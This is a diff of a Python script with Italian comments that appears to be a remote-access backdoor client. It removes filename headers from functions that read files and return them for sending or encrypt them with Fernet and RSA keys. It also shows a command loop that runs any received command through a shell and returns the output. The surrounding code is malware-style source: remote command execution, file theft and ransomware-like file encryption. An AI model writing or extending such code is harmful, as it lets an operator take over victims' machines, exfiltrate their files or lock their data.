@@ -23,9 +23,7 @@ def send_file(file_name):
     try:
         with open(file_name, "rb") as f:
             file_data = f.read()
-        # Header con nome file + file in binario
-        header = f"FILENAME:{file_name}\n".encode()
-        return header + file_data
+        return file_data
     except FileNotFoundError:
         return b"Error: file does not exist."
     
@@ -33,10 +31,8 @@ def cyph_file(file_name, fernet):
     try:
         with open(file_name, "rb") as f:
             file_data = f.read()
-        # Header con nome file + file in binario
-        header_enc = f"enc_{file_name}\n".encode()
         encrypted_file = fernet.encrypt(file_data)
-        return header_enc + b"\n" + encrypted_file
+        return encrypted_file
     except FileNotFoundError:
         return b"Error: file does not exist."
 
@@ -87,7 +83,7 @@ while True:
         public_key = rsa.PublicKey.load_pkcs1(received_key)
         output = cyph_file_asym(parts[1], public_key)
         
-        
+                
     # Svolge comandi cmd
     else:
         execute = subprocess.run(command, shell=True, capture_output=True, text=True)
